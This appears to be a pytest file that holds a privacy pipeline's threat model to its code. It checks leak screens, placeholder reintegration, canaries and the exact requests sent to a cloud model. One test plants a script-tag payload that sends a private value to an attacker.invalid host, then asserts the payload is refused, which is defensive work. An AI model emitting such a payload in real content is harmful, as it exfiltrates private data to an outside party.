"""The threat model must keep describing the code.

A threat model that drifts from the implementation is worse than none: it
tells a reviewer the system does something it does not. These tests fail if
a named module disappears, if a pinned number changes, or if a claimed
mechanism is removed.
"""

from __future__ import annotations

import functools
import json
import math
import pathlib
import re

import pytest

ROOT = pathlib.Path(__file__).resolve().parents[3]
DOC = (ROOT / "THREAT_MODEL.md").read_text()


@pytest.mark.security
@pytest.mark.parametrize("module", [
    "shared/shingle_filter.py",
    "gateway/linters/canary_matcher.py",
    "gateway/main.py",
    "backend/src/privdeep/tier3_reconcile/slot_reintegrator.py",
    "backend/src/privdeep/tier3_reconcile/citation_grounder.py",
    "backend/src/privdeep/tier2_cloud/abstract_payload.py",
    "backend/src/privdeep/eval/reconstruction.py",
    "gateway/tests/test_injection_redteam.py",
    "scripts/verify_partition.sh",
])
def test_every_named_module_exists(module):
    assert (ROOT / module).exists(), f"threat model names a module that is gone: {module}"


@pytest.mark.security
def test_shingle_window_matches_the_documented_claim():
    from shared.shingle_filter import ShingleFilter

    f = ShingleFilter(salt=b"x")
    assert (f.n_min, f.n_max) == (5, 8)
    assert "five or more words" in DOC and "n=5..8" in DOC


@pytest.mark.security
def test_redteam_split_matches_the_documented_claim():
    src = (ROOT / "gateway/tests/test_injection_redteam.py").read_text()
    m = re.search(r"==\s*\((\d+),\s*(\d+)\)", src)
    assert m, "the red-team file no longer pins its split"
    caught, missed = m.groups()
    assert f"catches {caught} of {int(caught) + int(missed)}" in DOC
    assert f"{missed} misses are strict xfails" in DOC


@pytest.mark.security
def test_entropy_threshold_is_alphabet_bound_as_documented():
    assert math.log2(16) < 4.85 < math.log2(64)
    assert "can never trip it" in DOC


@pytest.mark.security
def test_false_positive_report_backs_the_documented_rate():
    r = json.loads((ROOT / "eval/fp_report.json").read_text())
    assert "shingle" in json.dumps(r)
    assert "0/500" in DOC


@pytest.mark.security
def test_claimed_mechanisms_are_present_in_the_gateway():
    g = (ROOT / "gateway/main.py").read_text()
    for token in ("CONTAINMENT_FILTER_UNSEALED", "STRICT_FAIL_CLOSED",
                  "AUDIT_UNAVAILABLE", "_string_leaves"):
        assert token in g, f"threat model claims a mechanism the gateway lost: {token}"


@pytest.mark.security
def test_transport_position_check_still_covers_the_documented_positions():
    from privdeep.tier3_reconcile.slot_reintegrator import _UNSAFE_PATTERNS

    names = {n for n, _ in _UNSAFE_PATTERNS}
    assert {"link_dest", "inline_code", "html", "fence"} <= names


@pytest.mark.security
def test_reconstruction_keeps_the_lower_bound_framing():
    rec = (ROOT / "backend/src/privdeep/eval/reconstruction.py").read_text()
    assert "LOWER bound" in rec
    assert "lower bound on what is recoverable, never a worst case" in DOC


@pytest.mark.security
def test_chaffing_is_absent_as_the_document_states():
    assert not list((ROOT / "backend/src").rglob("*chaff*"))
    assert "is cut from this build" in DOC


# The tests below assert behaviour rather than the presence of a name. The
# distinction matters: `test_transport_position_check_still_covers_the_documented_positions`
# above passes with every pattern replaced by `re.compile("$^")`, and it passed
# throughout the period when five CommonMark constructs put private values into
# rendered `href`s. A grep for an identifier cannot see that the identifier
# stopped working.


@pytest.mark.security
def test_the_tokeniser_folds_what_section_4_1_says_it_folds():
    """P2's "verbatim" is only as wide as `tokenize`. §4.1 enumerates seven
    ways of sending the corpus unchanged; four of them are tokenisation's job."""
    import unicodedata

    from shared.shingle_filter import tokenize

    base = tokenize("Project Zephyr revenue")
    assert tokenize(unicodedata.normalize("NFD", "Project Zephyr revenue")) == base
    assert tokenize("Ｐｒｏｊｅｃｔ Ｚｅｐｈｙｒ ｒｅｖｅｎｕｅ") == base
    assert tokenize("Proj​ect Zep­hyr revenue") == base
    assert tokenize("Projеct Zephyr rеvеnuе") == tokenize(
        "Project Zephyr revenue"
    ), "Cyrillic homoglyphs must fold to Latin"
    assert "4.1" in DOC and "What \"verbatim\" means in P2" in DOC


@pytest.mark.security
def test_the_monitor_inspects_object_keys_not_only_values():
    """A private span in a JSON key used to yield an inspected text of
    `'string'` and pass all four screens."""
    import main

    leaves = set(main._string_leaves({"outer": {"a private sentence here": {"type": "x"}}}))
    assert "a private sentence here" in leaves


@pytest.mark.security
def test_the_monitor_chains_content_across_requests():
    """Without this the pipeline's own one-request-per-section shape defeats P2."""
    import main

    assert isinstance(main._carry, dict), "the carry is per JSON path"
    assert "_containment" in (ROOT / "gateway/main.py").read_text()


@pytest.mark.security
def test_the_seal_does_not_take_its_policy_from_the_monitored_party():
    """P4 is only structural if the core cannot choose the threshold."""
    from shared.shingle_filter import ShingleFilter

    with pytest.raises(ValueError, match="hit_threshold"):
        ShingleFilter(salt=b"s", hit_threshold=0)
    g = (ROOT / "gateway/main.py").read_text()
    for token in ("hit_threshold=SHINGLE_HIT_THRESHOLD", "require_n=", "require_non_empty=True"):
        assert token in g, f"the seal endpoint stopped enforcing its own policy: {token}"


@pytest.mark.security
def test_p5_is_decided_by_the_renderer_not_by_the_source_regex():
    """The check that actually holds P5 up: substitute, render, and refuse if a
    private value reached a fetching attribute or a script body."""
    from pathlib import Path

    from privdeep.models.document import Document, DocumentKind
    from privdeep.tier1_local.slot_masker import Entity, SlotMasker
    from privdeep.tier3_reconcile.slot_reintegrator import (
        ReintegrationRefused,
        SlotReintegrator,
    )

    text = "The Hanoi pilot was cancelled."
    doc = Document("d", DocumentKind.MARKDOWN, Path("d.md"), text)
    m = SlotMasker(b"session").mask(doc, [Entity("Hanoi", "LOCATION")])
    sid = m.replacements[0][1]

    # A script body is not a tag, so no tag pattern covers it; only the render
    # check sees it. This is the strongest of the five bypasses: no interaction.
    draft = f"<script>fetch('https://attacker.invalid/?d='+'{sid}')</script>"
    with pytest.raises(ReintegrationRefused, match="RENDERED_TRANSPORT_POSITION"):
        SlotReintegrator(m.table).reintegrate(draft, issued=[sid])

    # And the property must not be bought by refusing everything.
    ok = SlotReintegrator(m.table).reintegrate(f"The pilot in {sid} ended.", issued=[sid])
    assert "Hanoi" in ok.text


@pytest.mark.security
def test_canaries_are_planted_not_merely_registered():
    """P3 was true of the matcher and false of the system: `context_block()`
    was called by nothing outside its own tests."""
    import inspect

    from privdeep import pipeline
    from privdeep.tier1_local.ontology_extractor import OntologyExtractor

    assert "canary_context" in inspect.signature(OntologyExtractor.__init__).parameters
    src = inspect.getsource(pipeline)
    assert "canary_context=canaries.context_block()" in src
    assert src.index("canaries = CanaryInjector()") < src.index("await extractor.extract"), (
        "canaries must be minted before the prompts that are supposed to carry them"
    )


# REC2. The tests below build what crosses in-process, from the real code path,
# and check it against the document; none reads eval/runs.


def _section_3() -> str:
    start, end = DOC.index("## 3. Observation set"), DOC.index("## 4. What is enforced")
    return DOC[start:end]


def _section_3_1() -> str:
    section = _section_3()
    return section[section.index("### 3.1 Wire inventory"):]


def _table(header: str) -> set[str]:
    """The backticked first cells of the §3.1 table whose header row starts `| header |`."""
    lines = _section_3_1().splitlines()
    start = next(i for i, ln in enumerate(lines) if ln.startswith(f"| {header} |"))
    rows: set[str] = set()
    for ln in lines[start + 2:]:
        if not ln.startswith("|"):
            break
        m = re.match(r"^\| `([^`]+)` \|", ln)
        assert m, f"a {header} row does not start with a backticked name: {ln!r}"
        rows.add(m.group(1))
    return rows


# ------------------------------------------------------------------ templates

_FIELD = re.compile(r"<([a-z0-9 ]+)>")
# Which list an `each` line walks, known by the fields it contains.
_LISTS = {
    "relations": {"subject type", "predicate", "object type"},
    "slots": {"slot id", "category", "hex8"},
    "outline": {"mark", "outline id", "outline title"},
    "attributes": {"attribute code", "attribute meaning"},
    "evidence": {"evidence tag", "evidence summary"},
}
_SCALARS = {"goal", "cells", "blocks", "chars", "referent categories", "attribute codes",
            "section title", "objective", "word budget", "fact ref format"}


def _template(role: str) -> list[tuple[set[str], str]]:
    m = re.search(rf"^```wire:{role}\n(.*?)^```$", _section_3_1(), re.M | re.S)
    assert m, f"§3.1 has no wire:{role} template"
    out = []
    for line in m.group(1).splitlines():
        flags, bar, text = line.partition("|")
        assert bar, f"template line without a flags column: {line!r}"
        flags_set = set(flags.split())
        assert flags_set <= {"R1", "~R1", "each", "none"}, flags
        text = text[1:] if text.startswith(" ") else text
        unknown = set(_FIELD.findall(text)) - _SCALARS - set().union(*_LISTS.values())
        assert not unknown, f"template field the test cannot fill: {unknown}"
        out.append((flags_set, text))
    return out


def _render(role: str, r1: bool, scalars: dict[str, str],
            lists: dict[str, list[dict[str, str]]]) -> str:
    """The user message §3.1 says the core sends, filled from values the test holds."""
    def fill(text: str, values: dict[str, str]) -> str:
        return _FIELD.sub(lambda m: values.get(m.group(1), m.group(0)), text)

    out: list[str] = []
    walked: list[dict[str, str]] | None = None
    for flags, text in _template(role):
        if ("R1" in flags and not r1) or ("~R1" in flags and r1):
            continue
        if "each" in flags:
            fields = set(_FIELD.findall(text))
            (name,) = [k for k, v in _LISTS.items() if fields & v]
            walked = lists[name]
            out += [fill(text, {**scalars, **item}) for item in walked]
        elif "none" in flags:
            if not walked:
                out.append(fill(text, scalars))
        else:
            out.append(fill(text, scalars))
    return "\n".join(out)


# ------------------------------------------------------------------ the runs

CORPORA = ("smoke-q3", "portfolio-b", "prose-c", "offlex-d")
# Surface groups of eval/corpora/*/surfaces.json, as the categories an extractor
# would give them; the fact keys' referents are PROJECT, or ORG for the operator
# and the vendor.
_GROUP_CATEGORY = {"people": "PERSON", "sites": "LOCATION", "identifiers": "IDENTIFIER",
                   "amounts": "MONEY", "dates": "DATE", "quantities": "QUANTITY"}
# Abstract relations for the synthetic extraction. The first two recur in every
# document, so the merged payload's dropping of repeats is exercised.
_RELATIONS = (("ORGANISATION", "oversees", "INITIATIVE"),
              ("INITIATIVE", "reports", "FINANCIAL_METRIC"))
EVIDENCE = (("https://example.invalid/a", "Regional transit ridership rose last year."),
            ("https://example.invalid/b", "Capital programmes often slip by a quarter."))


def _synthetic_extraction(corpus: str, docs) -> list:
    from privdeep.tier1_local.ontology_extractor import ConceptRelation, Extraction
    from privdeep.tier1_local.slot_masker import Entity

    d = ROOT / "eval" / "corpora" / corpus
    groups = json.loads((d / "surfaces.json").read_text(encoding="utf-8"))["groups"]
    key = json.loads((d / "smoke_fact_key.json").read_text(encoding="utf-8"))
    candidates = [(t, "ORG" if k in ("ORG", "VENDOR") else "PROJECT")
                  for k, names in key["referents"].items() for t in names]
    candidates += [(t, c) for g, c in _GROUP_CATEGORY.items() for t in groups.get(g, [])]
    out = []
    for i, doc in enumerate(docs):
        seen: set[str] = set()
        ents = []
        for text, cat in candidates:
            if text in doc.text and text not in seen:
                seen.add(text)
                ents.append(Entity(text, cat))
        rels = [ConceptRelation(*r) for r in _RELATIONS]
        rels.append(ConceptRelation("DOCUMENT", f"records part {'abcdefgh'[i]}", "DECISION"))
        out.append(Extraction(entities=ents, relations=rels))
    return out


@functools.cache
def _run(corpus: str, arm: str, evidence: bool = False) -> dict:
    """One run of the real pipeline, with what it sent and what the test knows."""
    import asyncio

    import httpx
    from privdeep import pipeline as P
    from privdeep.ingest import SUFFIXES, load
    from privdeep.tier1_local.extraction_io import dump_extractions
    from privdeep.tier1_local.slm_client import AsyncSLMClient
    from privdeep.tier2_cloud.cloud_client import CloudClient
    from privdeep.tier3_reconcile.evidence_bank import EvidenceBank

    from . import test_payload_invariance as inv

    if corpus == "smoke-q3":
        docs, exs = list(inv._docs()), list(inv._extractions())
    else:
        d = ROOT / "eval" / "corpora" / corpus
        docs = [load(p) for p in sorted(d.iterdir()) if p.suffix.lower() in SUFFIXES]
        exs = _synthetic_extraction(corpus, docs)
    bank = EvidenceBank()
    for url, summary in (EVIDENCE if evidence else ()):
        bank.add(url, summary, summary)

    class Cloud(inv.Cloud):
        sections: list[dict] = []

        def __call__(self, req):  # type: ignore[no-untyped-def]
            resp = super().__call__(req)
            if req.url.path == "/v1/messages" and json.loads(req.content).get("tool_choice"):
                self.sections = json.loads(resp.content)["content"][0]["input"]["sections"]
            return resp

    cloud, seen = Cloud(), {}

    class Planner(P.MacroPlanner):
        async def plan(self, payload, goal):  # type: ignore[no-untyped-def]
            seen["payload"] = payload
            return await super().plan(payload, goal)

    with pytest.MonkeyPatch.context() as mp:
        mp.setenv("SHINGLE_HMAC_SALT", inv.GW_SALT.decode())
        mp.setattr(P, "MacroPlanner", Planner)
        res = asyncio.run(P.run_pipeline(
            docs, inv.GOAL,
            slm=AsyncSLMClient("http://local-slm:11434", model="qwen3:14b",
                               transport=httpx.MockTransport(inv._slm)),
            cloud=CloudClient(inv.GW, transport=httpx.MockTransport(cloud)),
            gateway_url=inv.GW, evidence=bank,
            gw_client=httpx.Client(transport=httpx.MockTransport(cloud)),
            session_salt=inv.SALT, run_id=f"rec2-{corpus}-{arm}", arm=arm,
            reuse_extraction=dump_extractions(docs, exs)))
    assert res.sections_refused == 0 and cloud.plan is not None
    assert len(cloud.drafts) == len(cloud.sections) == res.sections_ok
    return {"docs": docs, "exs": exs, "payload": seen["payload"], "plan": cloud.plan,
            "drafts": cloud.drafts, "sections": cloud.sections, "bank": bank}


RUNS = [(c, a, False) for c in CORPORA for a in ("baseline", "r5", "r1")] + \
       [("smoke-q3", a, True) for a in ("baseline", "r5", "r1")]


def _expected(run: dict, arm: str) -> tuple[str, list[str]]:
    """The planner and drafter user messages §3.1 describes, from values the test holds."""
    from privdeep.models.facts import ATTRIBUTE_CODES, ATTRIBUTE_MEANINGS, REFERENT_CATEGORIES
    from privdeep.tier1_local.slot_masker import SLOT_RE
    from privdeep.tier2_cloud.abstract_payload import FACT_REF_FORMAT, coarse_chars

    from .test_payload_invariance import GOAL

    r1 = arm == "r1"
    docs, payload = run["docs"], run["payload"]
    # Repeats dropped across documents, first appearance kept (G1).
    relations = list(dict.fromkeys(r.fields() for ex in run["exs"] for r in ex.relations))
    cat = dict(payload.slots)
    common = {"goal": GOAL, "referent categories": ", ".join(REFERENT_CATEGORIES),
              "attribute codes": ", ".join(ATTRIBUTE_CODES), "fact ref format": FACT_REF_FORMAT}
    rel_items = [{"subject type": s, "predicate": p, "object type": o} for s, p, o in relations]

    def slot_items(ids):  # type: ignore[no-untyped-def]
        return [{"slot id": s, "category": cat[s], "hex8": SLOT_RE.fullmatch(s).group("hex")}
                for s in ids]

    planner = _render("planner", r1, {
        **common, "cells": str(sum(len(d.cells) for d in docs)),
        "blocks": str(sum(len(d.blocks) for d in docs)),
        "chars": str(coarse_chars(sum(len(d.text) for d in docs)))},
        {"relations": rel_items, "slots": slot_items([s for s, _ in payload.slots])})
    ids = [f"s{i + 1}" for i in range(len(run["sections"]))]
    drafters = []
    for sid, sec in zip(ids, run["sections"], strict=True):
        drafters.append(_render("drafter", r1, {
            **common, "section title": sec["title"], "objective": sec["objective"],
            "word budget": str(sec["word_budget"])}, {
            "outline": [{"mark": ">" if i == sid else " ", "outline id": i,
                         "outline title": s["title"]}
                        for i, s in zip(ids, run["sections"], strict=True)],
            "relations": rel_items, "slots": slot_items(sec["slot_ids"]),
            "attributes": [{"attribute code": c, "attribute meaning": ATTRIBUTE_MEANINGS[c]}
                           for c in ATTRIBUTE_CODES],
            "evidence": [{"evidence tag": u.tag, "evidence summary": u.summary_claim}
                         for u in run["bank"]]}))
    return planner, drafters


def _paths(obj, prefix: str = "") -> set[str]:  # type: ignore[no-untyped-def]
    """JSON paths of every leaf; lists as `[]`, category-keyed dicts as `<category>`."""
    from privdeep.models.facts import REFERENT_CATEGORIES

    if isinstance(obj, dict):
        if obj and set(obj) <= set(REFERENT_CATEGORIES):
            return set().union(*(_paths(v, f"{prefix}.<category>") for v in obj.values()))
        return set().union(*(_paths(v, f"{prefix}.{k}" if prefix else k)
                             for k, v in obj.items())) if obj else {prefix}
    if isinstance(obj, list):
        return set().union(*(_paths(v, f"{prefix}[]") for v in obj)) if obj else {prefix + "[]"}
    return {prefix}


def _request_paths(body: dict) -> set[str]:
    # `tools` and `tool_choice` are compared whole against their constants.
    rest = {k: v for k, v in body.items() if k not in ("tools", "tool_choice")}
    return _paths(rest) | {k for k in ("tools", "tool_choice") if k in body}


@pytest.mark.security
@pytest.mark.parametrize(("corpus", "arm", "evidence"), RUNS)
def test_every_request_is_the_section_3_template(corpus, arm, evidence):
    """§3 says it states the observation set exhaustively. This holds it to that:
    each user message must equal the §3.1 template filled from values the test
    holds, byte for byte, so new content inside an existing line fails as surely as
    a new line; every request and payload field must have a §3.1 row; the tool,
    tool choice and system prompts must be the module constants."""
    from privdeep.tier2_cloud import macro_planner as mp_mod
    from privdeep.tier2_cloud import section_drafter as sd_mod

    run = _run(corpus, arm, evidence)
    planner, drafters = _expected(run, arm)
    assert run["plan"]["messages"][0]["content"] == planner
    assert [b["messages"][0]["content"] for b in run["drafts"]] == drafters

    request_rows, payload_rows = _table("Request field"), _table("Payload field")
    for body in (run["plan"], *run["drafts"]):
        unnamed = _request_paths(body) - request_rows
        assert not unnamed, f"request field on the wire with no §3.1 row: {unnamed}"
        assert len(body["messages"]) == 1 and body["messages"][0]["role"] == "user"
    assert run["plan"]["tools"] == [mp_mod._TOOL]
    assert run["plan"]["tool_choice"] == {"type": "tool", "name": "plan_outline"}
    assert run["plan"]["system"] == mp_mod._SYSTEM
    system = sd_mod._SYSTEM_FACTS if arm == "r1" else sd_mod._SYSTEM
    assert all(b["system"] == system for b in run["drafts"])
    named = set(re.findall(r"`([^`]+)`", _section_3_1()))
    for text in (mp_mod._SYSTEM, system):
        tokens = set(re.findall(r"⟦[^⟧]*⟧", text))
        assert tokens <= named, f"bracketed token in a system prompt not in §3.1: {tokens - named}"
    unnamed = _paths(json.loads(run["payload"].to_json())) - payload_rows
    assert not unnamed, f"payload field with no §3.1 row: {unnamed}"


@pytest.mark.security
def test_every_section_3_row_is_observed():
    """The other direction: a §3.1 row for a field that no run sends is a stale
    claim, and each arm's own blocks are seen at least once."""
    seen_req: set[str] = set()
    seen_payload: set[str] = set()
    for corpus, arm, evidence in RUNS:
        run = _run(corpus, arm, evidence)
        for body in (run["plan"], *run["drafts"]):
            seen_req |= _request_paths(body)
        seen_payload |= _paths(json.loads(run["payload"].to_json()))
    assert seen_req == _table("Request field")
    assert seen_payload == _table("Payload field")
    # Not vacuous: each arm-specific and list-specific line of the templates occurs.
    r1 = _run("smoke-q3", "r1", True)
    base = _run("smoke-q3", "baseline", True)
    drafts = "\n".join(b["messages"][0]["content"] for b in r1["drafts"])
    assert "facts: ⟦FACT:" in drafts and "\nATTRIBUTES (any placeholder" in drafts
    assert "\n[W1] " in drafts and "- (none for this section)" in drafts
    assert "ATTRIBUTES every placeholder" in r1["plan"]["messages"][0]["content"]
    assert "facts:" not in "\n".join(b["messages"][0]["content"] for b in base["drafts"])
    assert "(no public evidence supplied" in _run("prose-c", "r5", False)["drafts"][0][
        "messages"][0]["content"]


@pytest.mark.security
def test_relations_cross_once_each_in_first_appearance_order():
    """G1: the wire carries the set of distinct relations, not their multiset."""
    run = _run("portfolio-b", "r5")
    per_doc = [r.fields() for ex in run["exs"] for r in ex.relations]
    assert len(per_doc) > len(set(per_doc)), "the synthetic extraction must repeat relations"
    assert list(run["payload"].relations) == list(dict.fromkeys(per_doc))


@pytest.mark.security
def test_an_invented_placeholder_is_scrubbed_and_counted_never_resolved():
    """P6 as the pipeline runs it: scrub to a fixed literal, count, continue.

    Four tokens the core never issued, through run_pipeline on the r1 arm: a
    MONEY slot the session table does resolve (to "250000", asserted below) but
    R1 does not advertise, a slot and a fact reference with a hex nobody was
    issued, and an issued referent's fact reference with a code outside the
    vocabulary. None may resolve; each becomes the literal and is counted; the
    section is kept. The P6 row's grade is then checked against that behaviour,
    and the reintegrator's refusal, which the row calls defence in depth,
    against the same tokens."""
    from privdeep import pipeline as P
    from privdeep.tier1_local.fact_store import build_fact_store
    from privdeep.tier1_local.slot_masker import Entity, LocalMappingTable
    from privdeep.tier2_cloud.section_drafter import _UNRESOLVED
    from privdeep.tier3_reconcile.slot_reintegrator import (
        ReintegrationRefused,
        SlotReintegrator,
    )

    from .test_pipeline_exfil import ENTS, HEX, SALT, ZEPHYR, doc, run

    money = LocalMappingTable(SALT).slot_for(Entity("250000", "MONEY"))
    table = P._session_table(SALT, ENTS, normalise=True)
    # The case is real: the session table holds and resolves the MONEY slot.
    assert money in table and table.original(money) == "250000"
    invented = [money, "⟦SLOT:PROJECT_0badc0de⟧", "⟦FACT:0badc0de.AUTHAMT⟧",
                f"⟦FACT:{HEX}.SALARY⟧"]
    res = run(f"The budget of {ZEPHYR} was {invented[0]}. Also {invented[1]}, "
              f"{invented[2]} and {invented[3]} appear.")
    (sec,) = res.manifest.sections
    assert (res.sections_ok, res.sections_refused, sec.refused) == (1, 0, None)
    assert sec.invented_slots == 4
    assert res.report_markdown.count(_UNRESOLVED) == 4
    assert f"The budget of Project Zephyr was {_UNRESOLVED}." in res.report_markdown
    assert "250000" not in res.report_markdown, "an unissued placeholder was resolved"
    assert "⟦" not in res.report_markdown

    # The row states what was just shown: the literal, the count, and no refusal.
    row = next(ln for ln in DOC.splitlines() if ln.startswith("| P6 |"))
    mechanism, strength = row.split(" | ")[2:4]
    assert f"`{_UNRESOLVED}`" in mechanism and "`invented_slots`" in mechanism
    assert strength.startswith("**Deterministic: scrub and count.**")
    assert "not refused when `invented_slots` > 0" in strength

    # Defence in depth, as the row says: had a token reached the reintegrator it
    # would have refused the section, not resolved it.
    store = build_fact_store([doc()], table)
    reint = SlotReintegrator(table, strict=True, facts=store)
    for token, rule in ((invented[0], "INVENTED_SLOT"), (invented[1], "INVENTED_SLOT"),
                        (invented[2], "INVENTED_FACT"), (invented[3], "INVENTED_FACT")):
        with pytest.raises(ReintegrationRefused, match=rule):
            reint.reintegrate(f"The budget was {token}.", issued=[ZEPHYR])
    assert "`INVENTED_SLOT`, `INVENTED_FACT`" in mechanism
